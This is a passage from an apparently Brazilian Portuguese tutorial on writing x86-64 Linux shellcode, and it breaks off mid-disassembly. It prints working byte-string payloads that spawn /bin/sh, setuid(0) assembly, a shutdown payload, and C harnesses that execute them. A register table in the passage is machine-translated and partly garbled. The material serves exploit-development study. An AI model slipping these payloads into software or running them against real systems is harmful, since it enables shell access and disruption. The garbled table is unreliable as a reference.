+  <span class="mi">400094</span><span class="o">:</span>	<span class="mi">6</span><span class="n">c</span>                   	<span class="n">insb</span>   <span class="p">(</span><span class="o">%</span><span class="n">dx</span><span class="p">),</span><span class="o">%</span><span class="nl">es</span><span class="p">:(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
+  <span class="mi">400095</span><span class="o">:</span>	<span class="mf">6f</span>                   	<span class="n">outsl</span>  <span class="o">%</span><span class="nl">ds</span><span class="p">:(</span><span class="o">%</span><span class="n">rsi</span><span class="p">),(</span><span class="o">%</span><span class="n">dx</span><span class="p">)</span>
+  <span class="mi">400096</span><span class="o">:</span>	<span class="mi">2</span><span class="n">c</span> <span class="mi">20</span>                	<span class="n">sub</span>    <span class="err">$</span><span class="mh">0x20</span><span class="p">,</span><span class="o">%</span><span class="n">al</span>
+  <span class="mi">400098</span><span class="o">:</span>	<span class="mi">57</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">400099</span><span class="o">:</span>	<span class="mf">6f</span>                   	<span class="n">outsl</span>  <span class="o">%</span><span class="nl">ds</span><span class="p">:(</span><span class="o">%</span><span class="n">rsi</span><span class="p">),(</span><span class="o">%</span><span class="n">dx</span><span class="p">)</span>
+  <span class="mi">40009</span><span class="nl">a</span><span class="p">:</span>	<span class="mi">72</span> <span class="mi">6</span><span class="n">c</span>                	<span class="n">jb</span>     <span class="mi">400108</span> <span class="o">&lt;</span><span class="n">messagem</span><span class="o">+</span><span class="mh">0x77</span><span class="o">&gt;</span>
+  <span class="mi">40009</span><span class="nl">c</span><span class="p">:</span>	<span class="mi">64</span> <span class="mi">20</span> <span class="mi">64</span> <span class="mi">61</span> <span class="mi">20</span>       	<span class="n">and</span>    <span class="o">%</span><span class="n">ah</span><span class="p">,</span><span class="o">%</span><span class="nl">fs</span><span class="p">:</span><span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="n">rcx</span><span class="p">,</span><span class="o">%</span><span class="n">riz</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+  <span class="mi">4000</span><span class="nl">a1</span><span class="p">:</span>	<span class="mi">76</span> <span class="mi">69</span>                	<span class="n">jbe</span>    <span class="mi">40010</span><span class="n">c</span> <span class="o">&lt;</span><span class="n">messagem</span><span class="o">+</span><span class="mh">0x7b</span><span class="o">&gt;</span>
+  <span class="mi">4000</span><span class="nl">a3</span><span class="p">:</span>	<span class="mi">64</span>                   	<span class="n">fs</span>
+  <span class="mi">4000</span><span class="nl">a4</span><span class="p">:</span>	<span class="mi">61</span>                   	<span class="p">(</span><span class="n">bad</span><span class="p">)</span>  
+  <span class="mi">4000</span><span class="nl">a5</span><span class="p">:</span>	<span class="mi">0</span><span class="n">a</span>                   	<span class="p">.</span><span class="n">byte</span> <span class="mh">0xa</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span> <span class="n">a</span><span class="p">.</span><span class="n">out</span>
+<span class="s">&quot;</span><span class="se">\x48\x31\xc0\xb0\x01\xb2\x01\x48\xc7\xc6\x91\x00\x40\x00\xb2\x15\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05</span><span class="s">\</span>
+<span class="s">x48</span><span class="se">\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x20\x64\x61\x20\x76\x69\x64\x61\x0a</span><span class="s">&quot;</span>
+<span class="nl">len</span><span class="p">:</span>  <span class="mi">46</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span>  <span class="o">:</span><span class="n">D</span> <span class="n">mais</span> <span class="n">ou</span> <span class="n">menos</span></code></pre></div>
+
+<p>Deixar esse shellcode sem bytes nulos é simples, apenas é preciso saber o básico de desenvolvimento de shellcode e usar os métodos tradicionais para deixa-lo sem bytes nulos, veremos isso mais pra frente. para uma visão mais completa dos registradores vamos dar uma olhada no gdb :D</p>
+<pre class="code">
+Now the registers are: %rax, %rbx, %rcx, %rdx, %rsi, %rdi, %rbp, %rsp, 
+%r8-%r15, %rip, %eflags, %cs, %ss, %ds, %es, %fs, %gs:
+
+(gdb) i r
+rax            0x8      8
+rbx            0x0      0
+rcx            0x4000d7 4194519
+rdx            0x8      8
+rsi            0x5000d8 5243096
+rdi            0x1      1
+rbp            0x0      0x0
+rsp            0x7fffffff7a90   0x7fffffff7a90
+r8             0x0      0
+r9             0x0      0
+r10            0x0      0
+r11            0x302    770
+r12            0x0      0
+r13            0x0      0
+r14            0x0      0
+r15            0x0      0
+rip            0x4000d7 0x4000d7
+eflags         0x202    514
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+</pre>
+<p>32 operações de bits são convertidos para 64 bits valores com zeros. Em 8 e 16 bits operações são utilizados na parte inferior de registos. vamos ver cada um deles.</p>
+<pre class="code">
+             registro temporário; com argumentos variáveis &#8203;&#8203;Não
+% Rax
+             passa as informações sobre o número de SSE reg-
+             isters utilizado; 1 registrador de retorno
+             registo salvo-receptor; opcionalmente utilizada como base de Sim
+% Rbx
+             ponteiro
+             usado para passar argumento inteiro 4 de funções Não
+% Rcx
+             utilizado para passar 3 argumento para as funções; 2 No retorno
+% RDX
+             cadastre-se
+             stack pointer Sim
+% Rsp
+             registo salvo-receptor; opcionalmente utilizada como armação Sim
+% Rbp
+             ponteiro
+             utilizado para passar 2 argumento para as funções n
+% rsi
+             usado para passar primeiro argumento para funções Não
+% IDR
+             utilizado para passar 5 argumento para as funções n
+% R8
+             utilizado para transmitir 6 argumento para as funções n
+% R9
+             registro temporário, utilizado para a passagem de uma série de funções No
+% R10
+             ponteiro cadeia estática
+             temporária de registo de
+% R11
+             registradores salvos pelo callee Sim
+% R12-r15
+             usado para passar e voltar flutuante argumentos de ponto No
+% XMM0% XMM1
+             usado para passar argumentos de ponto flutuante No
+% XMM2% xmm7
+             registradores temporários No
+% Xmm8% xmm15
+             registradores temporários No
+% Mmx0% mmx7
+             registradores temporários; usado para retornar longa Não
+St0%,% st1
+             argumentos duplas
+             registradores temporários No
+% St2% st7
+             Reservado para o sistema (como dados específicos da linha de registo de
+% Fs
+             Controle SSE2 ea palavra de estado parcial
+mxcsr
+             x87 palavra de estado Não
+x87 SW
+             x87 palavra de controle Sim
+x87 CW
+</pre>
+<p>Para 32 bit , é muito comum encontra shellcode que executa /bin/sh, em 64 bit é a mesma coisa vamos dar uma comparada no que mudou:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="o">=========================================</span>
+ <span class="n">Executando</span> <span class="o">-</span> <span class="n">execve</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>  <span class="n">execve</span> <span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="o">=========================================</span>
+<span class="n">xor</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span> <span class="err">#</span> <span class="n">zera</span> <span class="n">eax</span>
+<span class="n">push</span>   <span class="o">%</span><span class="n">eax</span> 
+<span class="n">push</span>   <span class="err">$</span><span class="mh">0x68732f2f</span> <span class="err">#</span><span class="n">nossa</span> <span class="n">string</span>  <span class="s">&quot;hs//&quot;</span> <span class="o">==</span> <span class="o">/</span><span class="n">sh</span>
+<span class="n">push</span>   <span class="err">$</span><span class="mh">0x6e69622f</span> <span class="err">#</span> <span class="n">nossa</span> <span class="n">string</span> <span class="s">&quot;nib/&quot;</span> <span class="o">==</span>  <span class="o">/</span><span class="n">bin</span>
+<span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebx</span>  <span class="err">#</span> <span class="n">stack</span> <span class="n">pointer</span> 
+<span class="n">push</span>   <span class="o">%</span><span class="n">eax</span>
+<span class="n">push</span>   <span class="o">%</span><span class="n">ebx</span>
+<span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ecx</span> 
+<span class="n">mov</span>    <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="n">al</span> <span class="c1">// 11 syscall execve()</span>
+<span class="kt">int</span>    <span class="err">$</span><span class="mh">0x80</span> <span class="c1">// Kernel interrupção :D </span>
+<span class="o">================</span> <span class="n">c</span><span class="err">ó</span><span class="n">digo</span> <span class="n">em</span> <span class="n">C</span> <span class="o">==================</span>
+<span class="o">************************************************************************</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+ 
+<span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69</span><span class="s">&quot;</span>
+		  <span class="s">&quot;</span><span class="se">\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">&quot;Length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+<span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>Vamos dar uma olhada na shellcode execve() para 64 bit que muda alguns conceitos vamos lá, lembrando essa /bin/sh pode ser implementada de outras formas esse foi um exemplo que simples 23 bytes acho que não tem como reduzir o tamanho desse shellcode, 23 bytes já é muito foda, vamos para /bin/sh 64 agora: </p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">movabsq</span> <span class="err">$</span><span class="mh">0x68732f6e69622f20</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span> <span class="err">#</span><span class="c1">// &quot; /bin/sh&quot;  </span>
+	<span class="n">shr</span> <span class="err">$</span><span class="mi">8</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>	
+	<span class="n">pushq</span> <span class="o">%</span><span class="n">rax</span>		
+	<span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>	        
+	<span class="n">xorq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>		<span class="err">#</span><span class="c1">// %rax &lt;- 0</span>
+	<span class="n">pushq</span> <span class="o">%</span><span class="n">rax</span>
+	<span class="n">pushq</span> <span class="o">%</span><span class="n">rdi</span>
+	<span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rsi</span>		<span class="err">#</span><span class="c1">// %rsi &lt;- argv (singleton array containing &quot;/bin/sh&quot;)</span>
+	<span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdx</span>		<span class="err">#</span><span class="c1">// %rdi &lt;- envp (empty)</span>
+	<span class="n">addq</span> <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>	<span class="err">#</span><span class="c1">// %rax &lt;- __NR_execve</span>
+	<span class="n">syscall</span>
+<span class="o">======================</span> <span class="n">Compilando</span> <span class="n">e</span> <span class="n">executando</span> <span class="o">=========================</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">cat</span> <span class="n">shell</span><span class="p">.</span><span class="n">s</span> 
+	<span class="n">movabsq</span> <span class="err">$</span><span class="mh">0x68732f6e69622f20</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span> <span class="err">#</span><span class="c1">// &quot; /bin/sh&quot;</span>
+	<span class="n">shr</span> <span class="err">$</span><span class="mi">8</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>	
+	<span class="n">pushq</span> <span class="o">%</span><span class="n">rax</span>		
+	<span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>	        
+	<span class="n">xorq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>		<span class="err">#</span><span class="c1">// %rax &lt;- 0</span>
+	<span class="n">pushq</span> <span class="o">%</span><span class="n">rax</span>
+	<span class="n">pushq</span> <span class="o">%</span><span class="n">rdi</span>
+	<span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rsi</span>		<span class="err">#</span><span class="c1">// %rsi &lt;- argv (singleton array containing &quot;/bin/sh&quot;)</span>
+	<span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdx</span>		<span class="err">#</span><span class="c1">// %rdi &lt;- envp (empty)</span>
+	<span class="n">addq</span> <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>	<span class="err">#</span><span class="c1">// %rax &lt;- __NR_execve</span>
+	<span class="n">syscall</span>
+
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">c</span> <span class="n">shell</span><span class="p">.</span><span class="n">s</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">ld</span> <span class="n">shell</span><span class="p">.</span><span class="n">o</span>
+<span class="nl">ld</span><span class="p">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">find</span> <span class="n">entry</span> <span class="n">symbol</span> <span class="n">_start</span><span class="p">;</span> <span class="n">defaulting</span> <span class="n">to</span> <span class="mo">000000000040007</span><span class="mi">8</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">ls</span>
+<span class="n">a</span><span class="p">.</span><span class="n">out</span>  <span class="n">msg</span><span class="p">.</span><span class="n">o</span>  <span class="n">msg</span><span class="p">.</span><span class="n">s</span>  <span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span>  <span class="n">shell</span><span class="p">.</span><span class="n">o</span>  <span class="n">shell</span><span class="p">.</span><span class="n">s</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+<span class="cp"># exit  </span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+
+<span class="n">a</span><span class="p">.</span><span class="nl">out</span><span class="p">:</span>     <span class="n">file</span> <span class="n">format</span> <span class="n">elf64</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span>
+
+
+<span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
+
+<span class="mo">000000000040007</span><span class="mi">8</span> <span class="o">&lt;</span><span class="p">.</span><span class="n">text</span><span class="o">&gt;:</span>
+  <span class="mi">400078</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">b8</span> <span class="mi">20</span> <span class="mf">2f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> 	<span class="n">movabs</span> <span class="err">$</span><span class="mh">0x68732f6e69622f20</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mf">40007f</span><span class="o">:</span>	<span class="mf">2f</span> <span class="mi">73</span> <span class="mi">68</span> 
+  <span class="mi">400082</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c1</span> <span class="n">e8</span> <span class="mi">08</span>          	<span class="n">shr</span>    <span class="err">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mi">400086</span><span class="o">:</span>	<span class="mi">50</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rax</span>
+  <span class="mi">400087</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e7</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">40008</span><span class="nl">a</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">31</span> <span class="n">c0</span>             	<span class="n">xor</span>    <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mi">40008</span><span class="nl">d</span><span class="p">:</span>	<span class="mi">50</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rax</span>
+  <span class="mi">40008</span><span class="nl">e</span><span class="p">:</span>	<span class="mi">57</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rdi</span>
+  <span class="mf">40008f</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e6</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span>
+  <span class="mi">400092</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">c2</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rdx</span>
+  <span class="mi">400095</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="n">c0</span> <span class="mi">3</span><span class="n">b</span>          	<span class="n">add</span>    <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mi">400099</span><span class="o">:</span>	<span class="mf">0f</span> <span class="mo">05</span>                	<span class="n">syscall</span> 
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span> <span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+<span class="s">&quot;</span><span class="se">\x48\xb8\x20\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe8\x08\x50\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x89\xc2\x48\x83\xc0\x3b\x0f\x05</span><span class="s">&quot;</span>
+<span class="nl">len</span><span class="p">:</span>  <span class="mi">35</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> 
+<span class="o">=========================</span> <span class="n">Injetando</span> <span class="n">na</span> <span class="n">memoria</span> <span class="o">==============================</span>
+<span class="cp"># shell /bin/sh linux 644 bit </span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+ 
+<span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\xb8\x20\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe8\x08\x50\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x89\xc2\x48\x83\xc0\x3b\x0f\x05</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">&quot;Length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+<span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p> O que você pode ver ai em cima, é a mesma lógica da shell 32 bit's, basicamente nossa string hs/nib/  == 68732f6e69622f20. ela é movida  com a instrução <a>movabsq</a>  move o valor absoluto de uma quard word. shr 8, uma move todos os 8  bits  direito um só lugar.O bit mais à direita original será deslocado para fora da AL registar-se na bandeira carry (eo novo bit mais à esquerda é definida como 0).  o resto é tudo a mesma coisa do 32 bits movemos o enredeço da nossa string rdi, e depois <a>addq $0x3b, %rax</a> aqui adicionamos o valor da syscall que é a 59 ou em hex 3b. Vamos dar uma olhada na setuid(0)</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="o">==========================</span> <span class="n">em</span> <span class="n">C</span> <span class="o">================================</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;sys/types.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+   <span class="n">setuid</span><span class="p">(</span> <span class="mi">0</span> <span class="p">);</span>
+   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="o">===========</span> <span class="n">Em</span> <span class="n">Assembly</span> <span class="mi">64</span> <span class="n">bit</span> <span class="o">===========</span>
+ <span class="n">push</span> <span class="err">$</span><span class="mh">0x69</span>                  <span class="err">#</span> <span class="n">n</span><span class="err">ú</span><span class="n">mero</span> <span class="n">da</span> <span class="n">setuid</span><span class="p">()</span> 
+  <span class="n">pop</span> <span class="o">%</span><span class="n">rax</span>                       <span class="err">#</span> <span class="n">usa</span> <span class="n">o</span> <span class="n">registrador</span> <span class="n">para</span> <span class="n">fun</span><span class="err">çõ</span><span class="n">a</span> <span class="n">setuid</span><span class="p">()</span>
+  <span class="n">syscall</span>                        <span class="err">#</span> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span></code></pre></div>
+
+<p>Eu espero que você lembre para  que serve a setuid(), mas se você não lembra vamos refrescar sua memoria (User IDentifier - IDentificador 
+de Usuario ou User IDentification - IDentificacao de usuario) .  um numero frequentemente checado pelo Kernel (Nucleo do sistema) antes 
+de fazer determinadas operacoes. O UID '0' equivale a usuário root no  Linux. A instrução mov também podem ser emulados com uma operação de push / pop. Isto é necessário porque quando uma pequena instrução mov (para 0x69 no próximo exemplo) é executado, ele resulta em três nulos. Usando push e pop em vez de usar um registro menor (como% al, neste caso) também é mais eficiente, porque vai zerar o resto do registo, ao passo que se mudar para um registo menor ainda manter o conteúdo original no pedaços maiores de registo. Isso exigiria uma operação xor como nulo o registo primeiro (um total de cinco bytes, contra os três bytes na emulação push / pop).</p>
+<p> E para terminar a zueira sem limites porque aqui é Br, vamos escrever um shellcode para executar um shutdown no PC, sujuro que teste em uma maquina virtual :D, (o criador desse paper não será responsável por qualquer tipo de dado :D ). Objetivo: entender como passar mais  argumentos para um função execve() (não apenas um como é encontrado sempre), "vamos sair do obvio é pensar fora da caixa.".</p>
+<h3>O que vai ser preciso fazer ?</h3>
+<pre>
+========== Passos ============
+Objetivo : executar ---&gt; "/sbin/shutdown", "-h", "now", NULL };
+1 -  evitar bytes nulos
+2 -  colocar os argumento  now e -h sobre a stack
+3 -  colocar sbin/shutdown como argumento no registrador R8 
+4 -  colocar ponteiro cadeia estática a nossa string  "shutdown"
+5 - salvar os endereços no rsp
+6 -  chamar a syscall 59  execve()
+</pre>
+<p> Vamos lá, Let's Go. primeiro vamos evitar os null bytes, usado o método convencional zerar os registradores;</p>
+<pre class="code">
+xor rax, rax
+xor rdx, rdx
+</pre>
+<p>Agora precisamos colocar os argumento  na stack e salvar o stack pointer, nas linhas abaixo temos os seguintes passos: colocar o "w" que é o 77 na stack, depois colocamos a string on para que forme "now" na stack depois já sabemos o que acontece,colocamos novamente o próximo argumento o 0x682d que é o "-h", segundo passo Ok. </p>
+<pre class="code">
+push rax
+push byte 0x77
+push word 0x6f6e ;word "on" 
+mov rbx, rsp
+
+push rax
+push word 0x682d ;-h
+mov rcx, rsp
+</pre>
+<p>Agora volta a mesmo lógica do execve() que executa uma shell /bin/sh que já vimos nesse artigo, mas vamos usar outros registradores o R8, utilizado para transmitir 6 argumento para as funções n é o r10 que é um ponteiro justamente pra isso temporário, logo em seguida salvamos nosso argumento 1 no registrador %rdi fica asssim:</p>
+<pre class="code">
+push rax
+mov r8, 0x2f2f2f6e6962732f ; /sbin/
+mov r10, 0x6e776f6474756873  ; shutdown
+push r10
+push r8
+mov rdi, rsp
+</pre>
+<p>Agora é só chamar a syscall 59, mas antes disso vamos arrumar os argumento na stack. para depois com todos os argumento em seu divido lugar chamarmos a syscall que corresponde a 59 da tabela  unistd.</p>
+<pre class="code">
+push rdx
+push rbx
+push rcx
+push rdi
+mov rsi, rsp
+ 
+add rax, 59
+syscall
+</pre>
+<p> Pronto, vamos compila-lo e ver os Opcodes, depois tansforama-lo em shellcode o teste fica a seu critério vamos lá:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">nasm</span> <span class="o">-</span><span class="n">f</span> <span class="n">elf64</span> <span class="n">shutdown</span><span class="p">.</span><span class="k">asm</span> 
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">ld</span> <span class="n">shutdown</span><span class="p">.</span><span class="n">o</span> <span class="o">-</span><span class="n">o</span> <span class="n">desligar</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">ls</span>
+<span class="n">a</span><span class="p">.</span><span class="n">out</span>         <span class="n">demo</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">save</span>  <span class="n">eu</span><span class="p">.</span><span class="n">o</span>        <span class="n">passwd</span><span class="p">.</span><span class="k">asm</span><span class="p">.</span><span class="n">save</span>  <span class="n">shell</span><span class="p">.</span><span class="n">s</span>       <span class="n">vai</span>
+<span class="n">backdoor</span><span class="p">.</span><span class="k">asm</span>  <span class="n">desligar</span>     <span class="n">msg</span><span class="p">.</span><span class="n">s</span>       <span class="n">passwd</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">save</span>    <span class="n">shutdown</span><span class="p">.</span><span class="k">asm</span>
+<span class="n">backdoor</span><span class="p">.</span><span class="n">o</span>    <span class="n">eu</span><span class="p">.</span><span class="k">asm</span>       <span class="n">msg</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">save</span>  <span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span>     <span class="n">shutdown</span><span class="p">.</span><span class="n">o</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">desligar</span>
+
+<span class="nl">desligar</span><span class="p">:</span>     <span class="n">file</span> <span class="n">format</span> <span class="n">elf64</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span>
+
+
+<span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
+
+<span class="mo">00000000004000</span><span class="mi">80</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>
+  <span class="mi">400080</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">31</span> <span class="n">c0</span>             	<span class="n">xor</span>    <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
